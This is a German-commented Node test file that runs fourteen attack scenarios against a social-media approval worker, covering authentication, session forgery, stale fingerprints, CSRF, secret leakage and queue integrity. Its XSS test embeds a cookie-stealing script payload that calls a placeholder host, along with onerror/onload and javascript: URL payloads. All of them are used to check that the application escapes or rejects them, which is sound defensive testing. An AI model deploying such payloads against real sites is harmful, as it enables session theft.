/* =========================================================================
   vision-universe-social — DIE VIERZEHN ANGRIFFE

   -------------------------------------------------------------------------
   WOFUER DIESE DATEI DA IST - UND WOFUER NICHT
   -------------------------------------------------------------------------

   Die anderen Testdateien fragen: tut das Approval Center, was es soll?
   Diese fragt das Gegenteil: laesst es sich dazu bringen, etwas zu tun,
   was es nicht soll?

   Der Unterschied ist nicht rhetorisch. Ein Test, der den gewollten Weg
   geht, findet fehlende Funktionen. Ein Test, der den ungewollten geht,
   findet fehlende Grenzen - und eine fehlende Grenze faellt im Betrieb
   genau einmal auf, naemlich zu spaet.

   Jeder Fall hier benennt zuerst den ANGRIFF und dann die ANTWORT. Wo
   ein Fall schon anderswo geprueft ist, wird er trotzdem gefuehrt: die
   Frage ist hier eine andere, und wer die Grenze spaeter verschiebt,
   soll an dieser Liste vorbeimuessen.

   MEHRERE FAELLE SIND KEINE HYPOTHESEN. Der veraltete Tab, der
   Doppelklick und der Kandidat, der zwischen Anzeige und Klick
   abgeloest wird, sind in diesem Projekt schon vorgekommen - nur
   bisher an der Kommandozeile, wo ein Mensch danebenstand.
   ========================================================================= */
import test from "node:test";
import assert from "node:assert/strict";

import worker, { __internals } from "../src/index.js";
import {
  createEnv, request, TEST_ADMIN_KEY, TEST_APP_SECRET, PAGE_TOKEN,
  createPublishGraph, verbinde, PUBLISH_MEDIA_ID
} from "./harness.mjs";
import { contentHash } from "../src/redact.js";
import { CLAIM_PREFIX, DECISION_PREFIX, QUEUE_KEY } from "../src/store.js";
import { createSession, SESSION_COOKIE_NAME } from "../src/session.js";

const KEY = "?key=" + encodeURIComponent(TEST_ADMIN_KEY);
const ID = "cand_20260920_adversarial";
const INHALT = "pkg_adversarial";
const BILD = "https://research.visionuniverse.de/assets/social/pkg_adversarial.jpg";
const TEXT = "Der Beitrag, um den gespielt wird.";

async function hashFuer(over = {}) {
  return contentHash(Object.assign({ contentId: INHALT, imageUrl: BILD, caption: TEXT }, over));
}

async function lager(options = {}) {
  const g = createPublishGraph(options.graph || {});
  const env = createEnv(Object.assign({
    META_IG_ALLOWED_USERNAMES: "visionuniverse",
    VU_SOCIAL_AUTOPUBLISH: "off",
    __graph: g, __fetchImpl: g.fetchImpl
  }, options.env || {}));
  await verbinde(env);

  const hash = await hashFuer();
  const p = {
    version: __internals.QUEUE_VERSION, source: __internals.QUEUE_SOURCE,
    countedFiles: false, generatedAt: new Date().toISOString(),
    activeCount: 1, complete: true,
    items: [Object.assign({
      candidateId: ID, state: "AWAITING_APPROVAL", contentHash: hash,
      payload: { contentId: INHALT, imageUrl: BILD, caption: TEXT },
      asset: { zustand: "ASSET_PUBLICLY_REACHABLE", grund: null, erreichbar: true,
      url: BILD,
        satz: "Das Bild liegt unter genau dieser Adresse und ist abrufbar.",
        gemessenAm: "2026-09-21T10:00:00Z" },
      anzeige: { thema: { value: "Geheimes Thema", basis: "presentation.topic" },
        hook: { value: "Ein geheimer Hook.", basis: "presentation.hook" } },
      guete: { zustand: "BESTANDEN", score: 80, erklaerung: null, warnungen: [] },
      warum: {}
    }, options.eintrag || {})],
    unresolved: [], held: [], decided: [], unknown: [], total: 1
  };
  await worker.fetch(request("/social/approval/queue" + KEY, {
    method: "POST", body: JSON.stringify(p) }), env);

  const s = await worker.fetch(request("/approval/session", {
    method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ adminKey: TEST_ADMIN_KEY }) }), env);
  return { env, g, hash, cookie: s.headers.get("set-cookie").split(";")[0] };
}

const sende = (env, cookie, pfad, daten) => worker.fetch(request(pfad, {
  method: "POST",
  headers: Object.assign({ "content-type": "application/json" }, cookie ? { cookie } : {}),
  body: JSON.stringify(daten || {})
}), env);

const gesendet = (g) => g.aufrufe.filter((a) => /media_publish$/.test(a.pfad)).length;
const ansprueche = (env) =>
  [...env.VU_SOCIAL_KV.__raw().keys()].filter((k) => k.startsWith(CLAIM_PREFIX));

/* =====================================================================
   1-3  WER HEREINKOMMT
   ===================================================================== */

test("AX1 · Angriff: die Oberflaeche ohne Anmeldung aufrufen", async () => {
  /* Antwort: nichts. Kein Beitrag, kein Text, kein Bild, keine Kennung -
     und auch nicht die Zahl der Wartenden, denn wie viel ansteht ist
     selbst eine Auskunft ueber den Betrieb. */
  const { env } = await lager();
  const geheim = [TEXT, "Geheimes Thema", "Ein geheimer Hook.", ID, INHALT, BILD];

  for (const pfad of ["/approval", "/approval/" + ID, "/approval/session",
    "/approval/logout", "/health", "/", "/social/approval/queue"]) {
    for (const methode of ["GET", "POST"]) {
      const r = await worker.fetch(request(pfad, { method: methode }), env);
      const text = await r.text();
      for (const wort of geheim) {
        assert.ok(!text.includes(wort), `${methode} ${pfad} verraet "${wort}"`);
      }
    }
  }
});

test("AX2 · Angriff: mit einer abgelaufenen Sitzung weitermachen", async () => {
  /* Antwort: abgewiesen, und das Cookie wird geloescht. Ein Cookie, das
     der Browser weiter mitschickt, laesst den Owner immer wieder gegen
     dieselbe Wand laufen. */
  const { env, g, hash } = await lager();
  const { token } = await createSession(TEST_ADMIN_KEY,
    { now: Date.now() - 13 * 60 * 60 * 1000 });
  const alt = `${SESSION_COOKIE_NAME}=${token}`;

  for (const pfad of ["/approval", "/approval/" + ID]) {
    const r = await worker.fetch(request(pfad, { headers: { cookie: alt } }), env);
    assert.equal(r.status, 401, pfad);
    assert.match(String(r.headers.get("set-cookie")), /Max-Age=0/);
  }
  const p = await sende(env, alt, `/approval/${ID}/publish`, { fingerprint: hash });
  assert.equal(p.status, 401);
  assert.equal(gesendet(g), 0);
});

test("AX3 · Angriff: das Sitzungscookie selbst bauen", async () => {
  /* Antwort: die Signatur haelt. Sie ist aus dem Admin-Schluessel
     abgeleitet, den der Angreifer nicht hat - sonst braeuchte er das
     Cookie nicht. */
  const { env, g, hash } = await lager();
  const gefaelscht = [
    `${SESSION_COOKIE_NAME}=eyJ0IjoxNzg5OTE2MjAzLCJ2IjoxfQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`,
    `${SESSION_COOKIE_NAME}=` + (await createSession("ein-ganz-anderer-schluessel-mit-32-zeichen")).token,
    `${SESSION_COOKIE_NAME}=.`,
    `${SESSION_COOKIE_NAME}=`
  ];
  for (const c of gefaelscht) {
    const r = await worker.fetch(request("/approval", { headers: { cookie: c } }), env);
    assert.equal(r.status, 401, c.slice(0, 50));
    const p = await sende(env, c, `/approval/${ID}/publish`, { fingerprint: hash });
    assert.equal(p.status, 401);
  }
  assert.equal(gesendet(g), 0);
});

/* =====================================================================
   4-6  WAS FREIGEGEBEN WIRD
   ===================================================================== */

test("AX4 · Angriff: ein Tab von gestern gibt den Beitrag von heute frei", async () => {
  /* Der Fall ist nicht konstruiert: der Orchestrator loest Kandidaten
     ab, waehrend eine Seite offen liegt. Antwort: der Abdruck bindet
     die Freigabe an einen INHALT, nicht an eine Kennung. */
  const { env, g, cookie } = await lager();
  const alt = await hashFuer({ caption: "Der Text von gestern." });

  for (const pfad of [`/approval/${ID}/approve`, `/approval/${ID}/publish`,
    `/approval/${ID}/reject`]) {
    const r = await sende(env, cookie, pfad, { fingerprint: alt, reason: "egal" });
    assert.equal(r.status, 409, pfad);
    assert.match(await r.text(), /inzwischen aktualisiert/);
  }
  assert.equal(gesendet(g), 0);
  assert.deepEqual(ansprueche(env), []);
  assert.equal(await env.VU_SOCIAL_KV.get(DECISION_PREFIX + ID), null);
});

test("AX5 · Angriff: den Kandidaten im Speicher austauschen", async () => {
  /* Antwort: der Abdruck wird aus dem nachgerechnet, was gespeichert
     ist. Stimmt er nicht mit dem eingetragenen ueberein, ist der
     Eintrag nicht mehr der, ueber den entschieden werden sollte. */
  const { env, g, cookie, hash } = await lager();

  const schlange = JSON.parse(await env.VU_SOCIAL_KV.get(QUEUE_KEY));
  schlange.items[0].payload.caption = "Etwas voellig anderes.";
  await env.VU_SOCIAL_KV.put(QUEUE_KEY, JSON.stringify(schlange));

  const r = await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });
  assert.equal(r.status, 409);
  assert.match(await r.text(), /passt nicht zu seinem Abdruck/);
  assert.equal(gesendet(g), 0);
});

test("AX6 · Angriff: einen Kandidaten freigeben, der nicht mehr wartet", async () => {
  /* Antwort: die Schlange ist die Liste der Freigebbaren. Wer nicht
     darin steht, ist entschieden, abgeloest oder zurueckgehalten - und
     keiner dieser Zustaende ist freigebbar. */
  const { env, g, cookie, hash } = await lager();
  await worker.fetch(request("/social/approval/queue" + KEY, { method: "POST",
    body: JSON.stringify({ version: __internals.QUEUE_VERSION,
      source: __internals.QUEUE_SOURCE, countedFiles: false,
      generatedAt: new Date().toISOString(), activeCount: 0, complete: true,
      items: [], unresolved: [], held: [{ candidateId: ID }], decided: [],
      unknown: [], total: 1 }) }), env);

  const r = await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });
  assert.equal(r.status, 409);
  assert.equal(gesendet(g), 0);
});

/* =====================================================================
   7-8  WIE OFT
   ===================================================================== */

test("AX7 · Angriff: den Knopf zweimal druecken", async () => {
  /* Antwort: drei Linien. Die Entscheidung im Journal, der Anspruch auf
     dem Inhaltsobjekt, und die Idempotenz des Anspruchs. Der zweite
     Druck zeigt den bestehenden Beitrag statt einen zweiten zu machen. */
  const { env, g, cookie, hash } = await lager();

  const erst = await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });
  assert.equal(erst.status, 200);

  const zweit = await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });
  const html = await zweit.text();
  assert.equal(zweit.status, 200);
  assert.ok(html.includes(PUBLISH_MEDIA_ID), "Der bestehende Beitrag wird gezeigt.");

  assert.equal(gesendet(g), 1, "Es entstand ein zweiter Beitrag.");
  assert.equal(ansprueche(env).length, 1);
});

test("AX8 · Angriff: nach der Ablehnung doch noch freigeben", async () => {
  /* Antwort: eine Entscheidung wird nicht ersetzt. Weder durch eine
     zweite Ablehnung mit anderem Grund noch durch eine nachtraegliche
     Freigabe. */
  const { env, g, cookie, hash } = await lager();
  await sende(env, cookie, `/approval/${ID}/reject`,
    { fingerprint: hash, reason: "Nein, so nicht." });

  const r = await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });
  assert.match(await r.text(), /Abgelehnt/);
  assert.equal(gesendet(g), 0);

  const d = JSON.parse(await env.VU_SOCIAL_KV.get(DECISION_PREFIX + ID));
  assert.equal(d.decision, "REJECTED");
  assert.equal(d.reason, "Nein, so nicht.");
});

/* =====================================================================
   9-10  WAS DIE OBERFLAECHE NICHT DARF
   ===================================================================== */

test("AX9 · Angriff: ueber das Approval Center die Autopublish-Schalter setzen", async () => {
  /* Antwort: es gibt keinen Weg dorthin. Keine Route liest oder
     schreibt sie, und der Beweis ist nicht "wir tun es nicht", sondern
     dass die Werte nach jedem Weg unveraendert dastehen. */
  const { env, cookie, hash } = await lager();
  const vorher = { vu: env.VU_SOCIAL_AUTOPUBLISH, global: env.GLOBAL_AUTOPUBLISH };

  await worker.fetch(request("/approval", { headers: { cookie } }), env);
  await worker.fetch(request("/approval/" + ID, { headers: { cookie } }), env);
  await sende(env, cookie, `/approval/${ID}/approve`, { fingerprint: hash });
  await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash });

  assert.equal(env.VU_SOCIAL_AUTOPUBLISH, vorher.vu);
  assert.equal(env.GLOBAL_AUTOPUBLISH, vorher.global);
  assert.equal(env.VU_SOCIAL_AUTOPUBLISH, "off",
    "Es wurde veroeffentlicht - aber nicht, weil ein Schalter umgelegt wurde.");

  /* Und der Versuch, sie ueber den Rumpf mitzugeben, aendert nichts. */
  const r = await sende(env, cookie, `/approval/${ID}/publish`,
    { fingerprint: hash, VU_SOCIAL_AUTOPUBLISH: "on", autopublish: true });
  assert.equal(env.VU_SOCIAL_AUTOPUBLISH, "off");
  assert.ok(r);
});

test("AX10 · Angriff: ein Geheimnis aus der Oberflaeche lesen", async () => {
  /* Antwort: es steht in keinem Dokument, in keiner Kopfzeile, in
     keiner Adresse. Geprueft werden alle Seiten, die es gibt - und
     zwar auch die angemeldeten, weil ein Geheimnis hinter einer
     Anmeldung nicht weniger ein Geheimnis ist. */
  const { env, cookie, hash } = await lager();
  const geheimnisse = [TEST_ADMIN_KEY, TEST_APP_SECRET, PAGE_TOKEN,
    TEST_ADMIN_KEY.slice(0, 20), PAGE_TOKEN.slice(0, 20)];

  const antworten = [
    await worker.fetch(request("/approval"), env),
    await worker.fetch(request("/approval", { headers: { cookie } }), env),
    await worker.fetch(request("/approval/" + ID, { headers: { cookie } }), env),
    await sende(env, cookie, `/approval/${ID}/approve`, { fingerprint: hash }),
    await sende(env, cookie, `/approval/${ID}/publish`, { fingerprint: hash }),
    await worker.fetch(request("/approval/session", { method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ adminKey: TEST_ADMIN_KEY }) }), env)
  ];

  for (const r of antworten) {
    const alles = [...r.headers.entries()].map(([k, v]) => k + ": " + v).join("\n")
      + "\n" + (await r.text());
    for (const geheim of geheimnisse) {
      assert.ok(!alles.includes(geheim),
        "Ein Geheimnis steht in einer Antwort: " + geheim.slice(0, 12) + "…");
    }
  }
});

/* =====================================================================
   11-12  DER TEXT, DER VON AUSSEN KOMMT
   ===================================================================== */

test("AX11 · Angriff: ueber die Caption ein Skript einschleusen", async () => {
  /* Die Caption schreibt ein externer Creative Agent. Antwort: sie wird
     maskiert, nicht entfernt - der Owner soll sehen, was hinausginge,
     und nicht eine gesaeuberte Fassung davon. */
  const boese = '</p><script>fetch("//x.invalid?c="+document.cookie)</script>' +
    '<img src=x onerror=alert(1)><svg onload=alert(2)>';
  const hash = await contentHash({ contentId: INHALT, imageUrl: BILD, caption: boese });
  const { env, cookie } = await lager({
    eintrag: { contentHash: hash,
      payload: { contentId: INHALT, imageUrl: BILD, caption: boese } } });

  for (const r of [
    await worker.fetch(request("/approval/" + ID, { headers: { cookie } }), env),
    await sende(env, cookie, `/approval/${ID}/approve`, { fingerprint: hash })
  ]) {
    const html = await r.text();
    assert.ok(!/<script/i.test(html));
    assert.ok(!/<svg/i.test(html));
    assert.ok(!/<[a-z][^>]*\bon[a-z]+\s*=/i.test(html));
    assert.equal((html.match(/<img /g) || []).length, 1, "Ein zweites Bild-Tag.");
    assert.ok(html.includes("&lt;script&gt;"), "Der Text wurde gesaeubert statt maskiert.");
  }
});

test("AX12 · Angriff: ueber die Bildadresse etwas anderes unterschieben", async () => {
  /* Antwort: nur https, und die Pruefung greift schon beim Ablegen der
     Schlange. Eine data:-Adresse waere kein Asset aus dem Bestand, eine
     javascript:-Adresse waere gar kein Bild, und http waere im Browser
     blockierter Mischinhalt und bei Meta nicht abholbar. */
  const env = createEnv();
  for (const adresse of ["http://research.visionuniverse.de/x.jpg",
    "data:image/png;base64,AAAA", "javascript:alert(1)", "//x.invalid/y.jpg", ""]) {
    const r = await worker.fetch(request("/social/approval/queue" + KEY, {
      method: "POST", body: JSON.stringify({
        version: __internals.QUEUE_VERSION, source: __internals.QUEUE_SOURCE,
        countedFiles: false, generatedAt: new Date().toISOString(),
        activeCount: 1, complete: true, unresolved: [], held: [], decided: [],
        unknown: [], total: 1,
        items: [{ candidateId: ID, contentHash: "a".repeat(64),
          payload: { contentId: INHALT, imageUrl: adresse, caption: "x" } }]
      }) }), env);
    const b = await r.json();
    assert.equal(r.status, 400, adresse);
    assert.ok(["insecureImageUrl", "itemWithoutPayload"].includes(b.error), adresse);
  }
  assert.equal(await env.VU_SOCIAL_KV.get(QUEUE_KEY), null);
});

/* =====================================================================
   13-14  DIE LEISEN
   ===================================================================== */

test("AX13 · Angriff: eine Entscheidung ueber einen untergeschobenen Link ausloesen", async () => {
  /* Der klassische Fall: eine fremde Seite laedt ein Bild von
     /approval/<id>/publish, waehrend der Owner angemeldet ist.

     Antwort, doppelt: die Route nimmt nur POST an, und das
     Sitzungscookie traegt SameSite=Strict - es reist bei einer Anfrage
     von einer fremden Seite gar nicht erst mit. Beides wird geprueft,
     weil eine Verteidigung, die man nicht misst, eine Annahme ist. */
  const { env, g, cookie, hash } = await lager();

  /* 405 und nicht "irgendetwas ausser 200": der erste Anlauf prueste
     nur, dass nichts passiert - und blieb gruen, als die
     Methodenpruefung versuchsweise entfernt wurde. Sie blieb gruen aus
     einem zweiten, zufaelligen Grund (der Abdruck fehlte dann eben),
     und ein Waechter, der aus einem anderen Grund haelt als dem
     behaupteten, haelt beim naechsten Mal nicht. */
  for (const pfad of [`/approval/${ID}/publish`, `/approval/${ID}/reject`,
    `/approval/${ID}/approve`, "/approval/logout"]) {
    const r = await worker.fetch(request(pfad + "?fingerprint=" + hash,
      { headers: { cookie } }), env);
    assert.notEqual(r.status, 200, "GET " + pfad + " hat etwas getan");
    if (pfad.startsWith(`/approval/${ID}/`)) {
      assert.equal(r.status, 405, "GET " + pfad + " kam bis in die Entscheidung");
    }
  }
  assert.equal(gesendet(g), 0);
  assert.equal(await env.VU_SOCIAL_KV.get(DECISION_PREFIX + ID), null);

  /* Die zweite Linie, jetzt ausdruecklich: der Abdruck wird NIE aus der
     Adresszeile gelesen. Sonst genuegte ein Link mit dem richtigen
     Abdruck darin - und Abdruecke sind nicht geheim, sie stehen in
     jedem Formular. */
  const ueberQuery = await worker.fetch(request(
    `/approval/${ID}/publish?fingerprint=${hash}`,
    { method: "POST", headers: { cookie } }), env);
  assert.equal(ueberQuery.status, 409,
    "Der Abdruck aus der Adresszeile hat gewirkt.");
  assert.equal(gesendet(g), 0);

  /* Und das Cookie selbst. */
  const s = await worker.fetch(request("/approval/session", { method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ adminKey: TEST_ADMIN_KEY }) }), env);
  assert.match(s.headers.get("set-cookie"), /SameSite=Strict/);
});

test("AX14 · Angriff: die Warteschlange zaehlt Dateien statt Zustaende", async () => {
  /* Kein Angriff von aussen, sondern der teuerste von innen: eine
     zweite Rechnung, die dieselbe Frage anders beantwortet. Sie ist in
     diesem Projekt schon einmal passiert - "6 Kandidaten warten", und
     es waren null.

     Antwort: der Worker nimmt keine Schlange an, die sich nicht auf die
     kanonische Zustandsmaschine beruft, und er rechnet selbst nicht
     nach. */
  const env = createEnv();
  const basis = {
    version: __internals.QUEUE_VERSION, source: __internals.QUEUE_SOURCE,
    countedFiles: false, generatedAt: new Date().toISOString(),
    activeCount: 0, complete: true, items: [], unresolved: [],
    held: [], decided: [], unknown: [], total: 6
  };

  /* Eine Schlange, die zugibt zu zaehlen: abgewiesen. */
  const gezaehlt = await worker.fetch(request("/social/approval/queue" + KEY, {
    method: "POST", body: JSON.stringify(Object.assign({}, basis, { countedFiles: true,
      activeCount: 6 })) }), env);
  assert.equal((await gezaehlt.json()).error, "countedFiles");

  /* Eine ohne Berufung auf die Maschine: ebenso. */
  const fremd = await worker.fetch(request("/social/approval/queue" + KEY, {
    method: "POST", body: JSON.stringify(Object.assign({}, basis,
      { source: "readdirSync", activeCount: 6 })) }), env);
  assert.equal((await fremd.json()).error, "wrongSource");

  /* Und die echte: sechs Dateien im Bestand, null Wartende - und der
     Worker meldet null, nicht sechs. */
  const echt = await worker.fetch(request("/social/approval/queue" + KEY, {
    method: "POST", body: JSON.stringify(Object.assign({}, basis, {
      held: [{ candidateId: "a" }, { candidateId: "b" }, { candidateId: "c" }],
      decided: [{ candidateId: "d" }, { candidateId: "e" }, { candidateId: "f" }]
    })) }), env);
  assert.equal((await echt.json()).activeCount, 0);

  const s = await worker.fetch(request("/approval/session", { method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ adminKey: TEST_ADMIN_KEY }) }), env);
  const html = await (await worker.fetch(request("/approval",
    { headers: { cookie: s.headers.get("set-cookie").split(";")[0] } }), env)).text();
  assert.match(html, /wartet kein Beitrag/);
  assert.ok(!/6 Beitr/.test(html), "Sechs Dateien wurden zu sechs Wartenden.");
});
